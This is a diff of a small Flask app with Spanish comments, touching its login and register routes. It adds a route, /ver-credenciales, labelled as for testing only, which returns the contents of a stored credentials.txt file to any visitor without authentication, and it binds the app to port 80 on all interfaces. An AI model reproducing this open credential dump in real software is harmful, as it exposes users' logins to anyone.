@@ -11,6 +11,7 @@ def login():
     if request.method == "GET":
         return render_template("login.html")
 
+    # Procesar POST login
     email = request.form["email"]
     password = request.form["password"]
     
@@ -33,8 +34,15 @@ def register():
     
     return render_template("success.html")
 
-# Este bloque permite que Gunicorn cargue la app correctamente
+# Nueva ruta para ver credenciales guardadas (solo para pruebas)
+@app.route("/ver-credenciales")
+def ver_credenciales():
+    try:
+        with open("credentials.txt", "r") as f:
+            contenido = f.read()
+        return f"<pre>{contenido}</pre>"
+    except FileNotFoundError:
+        return "No hay credenciales guardadas aún."
+
 if __name__ == "__main__":
-    import os
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port)
+    app.run(host="0.0.0.0", port=80)
